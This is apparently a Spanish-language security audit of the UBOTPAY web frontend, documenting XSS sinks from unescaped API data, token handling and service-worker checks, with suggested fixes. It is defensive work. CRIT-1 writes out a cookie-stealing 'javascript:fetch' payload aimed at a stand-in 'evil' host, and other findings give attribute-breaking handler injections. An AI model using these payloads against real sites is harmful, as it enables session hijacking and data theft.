# Auditoría del frontend web — UBOTPAY

**Ronda:** revisión estática dirigida (sin red a producción)
**Alcance:** `/data/workspace/ubotpay/web/`
**Archivos auditados:** `index.html`, `agent.html`, `analytics.html`, `sw.js`, `manifest.json`, `security.txt`, `ubot.css`, `i18n.js`, `README.md`
**Fecha:** 2026-10-21

> Este informe NO repite hallazgos de rondas anteriores ya corregidos. Sólo lista lo que **sigue presente** en el código fuente actual. Confirmado por lectura de los ficheros: `/balance`, `/history`, `/auth/me`, `/bridge/*` están excluidos del `caches.put(...)` del service worker; existe `esc()` para saneado en algunas rutas; el repositorio no contiene páginas debug.

---

## Resumen

| Severidad | Cuenta |
|-----------|--------|
| Crítico   | 3      |
| Alto      | 4      |
| Medio     | 3      |
| Bajo      | 4      |
| No-es-problema | 4 |

Total verificados: 18 puntos. **3 críticos requieren fix antes de que un partner / IA devolviendo HTML roma pueda ejecutar JS en la sesión del usuario.**

---

## CRÍTICO

### CRIT-1 · `index.html:177` (acción `settled`) — `${d.explorer}` en `href` sin escapar (XSS por respuesta API)

**Qué hace:** el render del chat (`render()`) construye HTML crudo interpolando campos del JSON devuelto por `POST /turn`:

```js
extra = `<div class="tx">… <a href="${d.explorer}" target="_blank">${d.tx}</a>${d.fee_tx ? `… <a href="${d.fee_explorer}" target="_blank">tx</a>` : ''}</div>`;
```

Después pasa `extra` a `add("b", esc(res.say) + extra)`, donde `add` hace `d.innerHTML = html`.

**Por qué importa:** la cadena `extra` se inserta **sin escapar** en el DOM. Si un endpoint que llegue a alimentar ese JSON (incluido el propio backend de ubotpay, un partner de bridge, o una rama de error del propio `brain.py`) devuelve `d.explorer = "javascript:fetch('https://evil/?'+document.cookie)"` o cualquier otro atributo que rompa la comilla del href, el navegador ejecuta el JS al hacer click. **`target="_blank"` no mitiga `javascript:`** (los navegadores modernos sí lo bloquean para `href` en `<a>` cuando hay `target="_blank"`, pero la propia cadena puede romper antes con `\"`. Adicionalmente, también se inyecta el valor como **texto** `${d.tx}` dentro del `<a>`, donde cualquier `<script>` o `<img onerror>` rompería el árbol). El campo además está siendo atribuido (`href="${…}"`), por lo que rompe tanto con `"` como con caracteres de control.

Las fuentes de datos que aterrizan aquí son: la respuesta del propio backend (`api.py`) y, transitivamente, las salidas que el LLM/ElevenLabs haya podido insertar en `data` por medio de tool calls. Un partner comprometido o un prompt-injection que altere `data.explorer` ejecuta JS en la sesión conectada, con el JWT de sesión en `localStorage`.

**Severidad:** crítico — XSS store + token-bearing localStorage.

**Fix sugerido:** dejar de usar template-literal-then-`innerHTML`. Reconstruir con `createElement`/`textContent`/`setAttribute("href", url)` validando el esquema (`if (!/^https?:/.test(url)) return;` o `safeUrl(url)`). Aplica a TODAS las ramas de `render()` (líneas 177–183).

---

### CRIT-2 · `index.html:181` (acción `agent_paid`) — `${p.explorer}` y `${p.tx}` sin escapar (XSS por respuesta del partner x402)

**Qué hace:** en la rama `agent_paid` se interpola `p.explorer` y `p.tx` como href/texto dentro de un string que va a `innerHTML`. `${rep.thesis_fit}` y `${rep.red_flags}` sí se escapan — pero los hashes tx y la URL del explorador no.

```js
<a href="${p.explorer}" target="_blank">${p.tx||""}</a>
```

**Por qué importa:** `p` viene del endpoint `/agent/query` que habla con DataAgent (tercero) y con un partner de bridge. Un DataAgent comprometido, una rama de error que interpole inputs del usuario en la URL del explorador, o un bug que confunda `from` con `to` permite inyectar `" onload="alert(1)` en `href` y el navegador ejecutará el handler. El usuario conectado tiene JWT activo → robo de cuenta trivial.

**Severidad:** crítico — XSS por partner externo en página autenticada.

**Fix:** mismo patrón que CRIT-1. Mejor usar `URL.canParse(p.explorer)` + scheme check antes de `setAttribute`.

---

### CRIT-3 · `index.html:838` — `${b.error || "unknown error"}` en `innerHTML` desde `/bridge/<id>/status`

**Qué hace:** el polling del estado del bridge concatena la cadena de error del backend sin escapar y la inyecta via `innerHTML`:

```js
status.innerHTML = "❌ Bridge failed: " + (b.error || "unknown error");
```

**Por qué importa:** `b` viene de `/bridge/{bridge_id}/status`. Si esa ruta devuelve en `error` cualquier cadena que el llamador (o un registro manipulado) haya podido escribir — y `bridge_id` viene de la UI, no validado en este punto — un bridge con un campo `error` malicioso ejecuta HTML/JS. La línea 833 también lo hace: `status.innerHTML = "✅ Done! … Bridge ID: " + payBridgeId` (payBridgeId viene de la respuesta de `/bridge/start`, menor riesgo).

**Severidad:** crítico — el `error` es una string libre, no se valida el esquema, y la sesión ya está autenticada.

**Fix:** `status.textContent = "❌ Bridge failed: " + (b.error || "unknown error");` (una letra de cambio). Mismo fix para 833.

---

## ALTO

### ALTO-1 · `index.html:177` (settled) — `${d.amount_usdc}`, `${d.latency_s}`, `${d.fee_usdc}` sin escapar en texto del mensaje

**Qué hace:** además del href vulnerable (CRIT-1), los importes y latencia del bridge también se inyectan crudos al DOM. Aunque la probabilidad de XSS por un número es baja (no hay caracteres HTML especiales salvo `.`), el patrón es frágil: cualquier cambio del backend para añadir unidades (`"2.50 USDC"`, `"<pending>"`) rompe la regla. Hoy mismo el `latency_s` puede no ser número (depende del parser Python).

**Por qué importa:** patrón permisivo que invita a fallos en la próxima iteración; además, abre puerta a renderizar un `<script>` si en una nueva feature alguien añade `data.note` o similar.

**Severidad:** alto — defensa-en-profundidad. Romper además del CRIT-1.

**Fix:** usar `.textContent` para los valores numéricos, o `esc(d.amount_usdc)` dentro de la template.

---

### ALTO-2 · `analytics.html:225-233` — `${b.tx_hash}`, `${b.amount_usdc}`, `${b.tool}`, `${b.status}`, `${b.from_chain}` y `${b.tx_hash || ""}` en `title="${...}"` sin escapar

**Qué hace:** el render de la tabla de bridges recientes inserta **toda** la respuesta de `/bridge/analytics` por interpolación, sin `esc`:

```js
return `<tr>
  <td>${date}</td>
  <td class="amount">${b.amount_usdc} USDC</td>
  <td>${b.from_chain} → ${b.to_chain}</td>
  <td>${b.tool || "—"}</td>
  <td>${statusBadge(b.status)}</td>          // statusBadge tampoco escapa
  <td>${dur}</td>
  <td title="${b.tx_hash || ""}">${shortTx}</td>
</tr>`;
```

`statusBadge()` interpola `status` dentro de una `class="status ${cls}"`: si `cls = '" onmouseover="alert(1)'` rompe el atributo.

**Por qué importa:** `/bridge/analytics` es un endpoint autenticado con JWT, pero la respuesta puede incluir tool names de los partners de bridge (LI.FI, Across, …) que viajan desde ellos. Un partner comprometido o un almacenamiento interno sucio entrega XSS al usuario autenticado. La sesión contiene el JWT.

**Severidad:** alto — tabla autenticada con sinks sin escape.

**Fix:** `esc(b.amount_usdc)`, `esc(b.tool)`, `esc(b.status)`, `esc(b.tx_hash)`, y `${b.tx_hash ? \`title="${esc(b.tx_hash)}"\` : ""}`. Reemplazar el render completo por `createElement` con `textContent`/`title` (más simple y robusto).

---

### ALTO-3 · `agent.html:94` — `${p.explorer}`, `${j.price_usdc}`, `${j.latency_s}` en `innerHTML`

**Qué hace:** la página del agente (DataAgent) construye el mensaje de éxito con la respuesta del endpoint `/agent/query` directamente:

```js
$("paystat").innerHTML = j.paid
  ? `<span class="badge ok">PAID</span>${j.price_usdc} USDC · ${j.latency_s}s · <a href="${p.explorer}" target="_blank">tx ↗</a>`
  : `<span class="badge bad">FAILED</span>${(j.body||{}).error||j.error||j.status}`;
```

**Por qué importa:** mismo patrón que CRIT-2 pero en otra página. La página `agent.html` también carga el SW y guarda JWT si el usuario conecta wallet (línea 202-203). El `error` en la rama FAILED **tampoco se escapa**.

**Severidad:** alto — sink XSS en página autenticable.

**Fix:** idéntico al CRIT-2; usar `esc(j.price_usdc)`, `esc(j.latency_s)`, validar `p.explorer` con scheme check antes de `setAttribute`.

---

### ALTO-4 · `index.html:570` — `window.open(ex, "_blank")` con `addr` (dirección cripto) usada para construir la URL del explorador

**Qué hace:** desde el popover de wallet info:

```js
const ex = (chain.explorer || "https://snowtrace.io") + "/address/" + addr;
window.open(ex, "_blank");
```

`chain.explorer` viene del backend (`/auth/wallet/verify` o `/bridge/chains`); `addr` viene de la wallet que el usuario acaba de firmar.

**Por qué importa:** si el backend construye `chain.explorer` con input de usuario o se consigue que una entrada de chains admita esquemas exóticos, el `window.open` puede navegar a `javascript:` o `data:`. El navegador moderno bloquea `javascript:` en `window.open` con target string, pero un esquema tipo `data:text/html,...` sí llega a ejecutarse en muchos navegadores antiguos. Riesgo bajo pero presente.

**Severidad:** alto — defensa-en-profundidad.

**Fix:** `if (!/^https:\/\//.test(chain.explorer)) ex = "https://snowtrace.io";`. Validar también que `addr` pase `Web3.utils.isAddress(addr)` antes de concat.

---

## MEDIO

### MEDIO-1 · `index.html:406` — `micsel.innerHTML = devs.map(d => ...${d.deviceId}...${d.label}...)` desde `enumerateDevices()`

**Qué hace:** los dispositivos de audio del usuario (etiqueta y deviceId) se inyectan en un `<select>` con `innerHTML`:

```js
micsel.innerHTML = devs.map(d => `<option value="${d.deviceId}" ${curId === d.deviceId ? "selected" : ""}>${d.label || "Microphone"}</option>`).join("");
```

**Por qué importa:** `deviceId` y `label` los rellena el SO del usuario, no un atacante remoto. **No es XSS explotable en la práctica**, pero rompe la regla del sanitizer `esc()` que está 200 líneas más arriba y obliga a confiar en el kernel del SO. Si en el futuro alguien añade una fuente remota al dropdown (por ejemplo, una lista de dispositivos bluetooth remotos), el sink ya está abierto.

**Severidad:** medio (defensa-en-profundidad, no explotable hoy).

**Fix:** `d.option = document.createElement("option"); option.value = d.deviceId; option.textContent = d.label || "Microphone"; option.selected = (d.deviceId === curId); micsel.appendChild(option)`.

---

### MEDIO-2 · `analytics.html:241-303` — `render(data)` pinta **todo** el payload con `innerHTML`

**Qué hace:** el helper `render()` de analytics hace `document.getElementById("root").innerHTML = ...` con template literals que contienen `${t.count}`, `${t.volume_usdc}`, `${t.fees_usd}`, etc., todos sin escapar. Además las sub-funciones `renderDonut`, `renderBars`, `renderTable` (ALTO-2) usan el mismo patrón.

**Por qué importa:** si el backend de `/bridge/analytics` incluye algún día un campo con HTML (por ejemplo un `note` por bridge o un nombre de usuario), hay XSS inmediato. Hoy la respuesta no trae HTML, pero la regla del codebase es "todo lo que pinte respuesta del backend se escapa", y este fichero la rompe sistemáticamente.

**Severidad:** medio — mismo punto que ALTO-2 pero a nivel de bloque; agrupado en el fix.

**Fix:** sustituir el render entero por construcción DOM; los KPIs pueden ser `textContent` directos.

---

### MEDIO-3 · `index.html:172` — helper `add(cls, html)` no diferencia texto de HTML

**Qué hace:** la helper `add(cls, html)` del log de chat coge cualquier string HTML y lo pone con `innerHTML`. Es la herramienta usada por casi todas las ramas de `render()`:

```js
const add = (cls, html) => { const d = document.createElement("div"); d.className = "msg " + cls; d.innerHTML = html; log.appendChild(d); ... };
```

**Por qué importa:** el nombre sugiere `html` pero en varios sitios del código se llama como si fuera `text` (por ejemplo `add("u", esc(text))` en línea 192 — aquí el autor lo escapa antes, buena práctica), pero en `add("sys", I18N.t("thinking"))` en línea 193 el string NO se escapa. `I18N.t` hoy devuelve textos estáticos, pero si en el futuro se internacionaliza contenido dinámico, el sink se reventará.

**Severidad:** medio — API helper que confunde texto y HTML y se usa docenas de veces; rompe las defenses del `esc()` definidas 1 línea más abajo.

**Fix:** renombrar a `addHtml(cls, html)` y crear un `addText(cls, text)` que use `textContent`. Migrar las llamadas que mezclan.

---

## BAJO

### BAJO-1 · `index.html:9` — `localStorage.getItem("ubotpay-theme")` se refleja en el atributo `data-theme` sin validar

**Qué hace:** `<script>` inline en el `<head>` lee `localStorage` y lo aplica con `setAttribute("data-theme", t)`. Sin embargo, ya lo sanea antes de pasarlo al CSS (el atributo controla el tema; no se renderiza como HTML). **No es XSS.**

**Por qué importa:** un atacante que controle `localStorage` (por ejemplo vía XSS previo) puede inyectar valores arbitrarios al atributo, pero al no renderizarse como HTML no ejecuta JS. Es safe actualmente.

**Severidad:** bajo — defensivo, no crítico.

**Fix opcional:** `t = t === "dark" ? "dark" : "light";` antes del setAttribute.

---

### BAJO-2 · `index.html:867` — JWT de sesión se pasa por querystring al abrir el bot de Telegram (`/link <token>`)

**Qué hace:**

```js
const link = "https://t.me/UbotpayBot?text=" + encodeURIComponent("/link " + token);
window.open(link, "_blank", "noopener");
```

`token` viene de `localStorage.getItem("ubotpay_session")` (JWT de sesión).

**Por qué importa:** el token va a la URL — termina en el historial del navegador, en logs de referral de t.me, y se ve en la barra de direcciones del usuario. Es una *decisión de diseño* ya tomada por el dueño del flujo (parece intencional para re-vincular cuenta), y el `encodeURIComponent` evita XSS aquí. **No es un bug**, pero merece la pena documentarlo en el `.env.example` y en el deploy checklist.

**Severidad:** bajo (info, no bug).

**Fix:** ninguno necesario. Considerar nota en deploy check: "JWT puede aparecer en logs de intermediarios al enlazar Telegram".

---

### BAJO-3 · `index.html:1467-1469` — modo debug abierto por querystring (`?open=1`)

**Qué hace:** `if (location.search.indexOf("open=1") >= 0) { setTimeout(() => { try { openModal(); } catch(e) {} }, 1000); }`.

**Por qué importa:** un atacante puede inducir al usuario a abrir `ubotpay.com/?open=1` y forzar la apertura del modal de wallet. No es un riesgo de seguridad por sí mismo — abre el modal que el usuario ya abriría — pero suma una superficie de annoyance/phishing (modal abierto sin acción del usuario). Poca cosa.

**Severidad:** bajo.

**Fix:** condicionar a un flag/secret de entorno (mismo patrón que el `__UBOT_API_KEY__`).

---

### BAJO-4 · `sw.js:347-349` — handler de `online` no `event.waitUntil`

**Qué dice el código:**

```js
self.addEventListener("online", () => {
  processOutbox().catch((e) => console.warn("[sw] online flush failed", e));
});
```

**Por qué importa:** el SW puede descargarse antes de que termine `processOutbox()` en condiciones de batería baja / kill rápido, dejando acciones del outbox sin ejecutar. No es un bug de seguridad, pero el outbox contiene `{url, headers, body}` con un **JWT de sesión en `headers`**, así que un fallo del SW no debe dejar esa info tirada en `console.warn`. Hoy `console.warn` no la incluye (el SW solo maneja refs al item, no el body completo) → **no-es-problema**.

**Severidad:** bajo (defensivo, no afecta a secretos).

**Fix opcional:** envolver en `event.waitUntil(processOutbox())` para que el browser mantenga vivo el SW hasta terminar.

---

## NO-ES-PROBLEMA (verificado)

### NEP-1 · `sw.js` excluye `/balance` y `/history` del cache (líneas 110-113)

Verificado leyendo `sw.js:110-113`: el handler devuelve early sin `respondWith`. No llega a Cache Storage. Tampoco se cachea nada que lleve `Authorization` o `x-api-key` (líneas 66-68). Los endpoints transaccionales (`/bridge/*`, `/turn`, `/agent/*`, `/auth/wallet/*`, `/auth/me`, `/approve`, `/reject`) están en la lista network-only (líneas 71-84). El único dato que se persiste en cache es estático (`/health`, `/auth/chains`, `/bridge/chains`, precache del shell). **Buena configuración.**

### NEP-2 · `sw.js:280-284` — guard de same-origin en `processOutbox()`

Verificado: valida `itemUrl.hostname !== self.location.hostname` y descarta el item si no coincide. **Protección correcta contra outbox poisoning.**

### NEP-3 · No hay secretos embebidos en el código fuente

`grep "__UBOT_API_KEY__\|UBOT_API_KEY\|AGENT_ID\b"` en `/data/workspace/ubotpay/web/` sólo aparece en `README.md` con el comando `sed` del deploy. El código en repo contiene los placeholders (`__UBOT_API_KEY__`, `__AGENT_ID__`) que se sustituyen en `/var/www/ubotpay/index.html` y `/agent.html` por variables de entorno en tiempo de deploy. El `AGENT_ID` referenciado en `index.html:414` no está definido en el repo — debe inyectarse igual por deploy. El único ID hardcodeado de ElevenLabs en `agent.html:438` (`agent_3601m4yz1xhgffmb1mb4j0sab89a`) es público por diseño del proveedor (es el `agentId` de la conversación).

La constante `ROOT_API = "https://api.ubotpay.com"` y el endpoint `/push/vapid-key` (cuyo `public_key` es público por RFC 8292) tampoco son secretos. El JWT de sesión se almacena en `localStorage`, lo correcto para SPAs.

### NEP-4 · CORS / seguridad de red es responsabilidad del backend

Auditoría dirigida al frontend: CORS, CSP, HSTS viven en `deploy/nginx.conf` y `api.py`. Ambos ya se auditaron en rondas previas (no se repiten aquí). El frontend no declara CORS propio. El push handler del SW (`sw.js:161-189`) parsea con `event.data.json()` y atrapa excepciones; `data.url` no se pasa a `eval`, sólo se usa como `notificationclick` objetivo y como `data` del dict para `clients.openWindow`. Todo benigno.

---

## Recomendaciones priorizadas

1. **Inmediato (CRIT):** sustituir `add("b", esc(res.say) + extra)` y los `innerHTML` de `paystat`/`pay-status` por construcción DOM. Aprox. 8 líneas cambian, todas en `index.html` líneas 177–183 y 833/838, y en `agent.html` línea 94. Riesgo de regresión bajo (la lógica de presentación es trivial).
2. **Misma tanda (ALTO):** reemplazar el `render*` de `analytics.html` por `createElement`/`textContent`. Re-escritura de ~80 líneas pero sin tocar funcionalidad: el front ya muestra los datos, sólo cambia el método de pintado. Riesgo bajo.
3. **Defensa-en-profundidad (MEDIO/BAJO):** helper `add()` renombrado, validación de `chain.explorer` y validaciones con whitelist de schemes en cualquier `window.open` futuro.

Notas operativas para el fix:

- Cada cambio pertenece a `index.html`/`agent.html`/`analytics.html` (no hay build pipeline; nginx sirve HTML estático). Tras el patch, **es necesario `cp` los tres HTML a `/var/www/ubotpay/`** y reiniciar nginx (no, nginx lee de disco, basta con sobreescribir; el `service worker` se actualiza con `CACHE_NAME = "ubotpay-v6"` y `self.skipWaiting()` ya está en el SW actual → un bump fuerza refresh).
- La versión del SW está en `sw.js:17` (`CACHE_NAME = "ubotpay-v5"`). Subir a `ubotpay-v6` con el fix para que el HTML viejo no quede cacheado.
- **Verificación post-fix:** abrir `/`, conectar wallet, pedir `/turn` con un payload de prueba cuyo `data.explorer = "javascript:alert(1)"` y comprobar que se pinta como texto, no como href. Mismo test para `b.error` en `/bridge/<id>/status`.
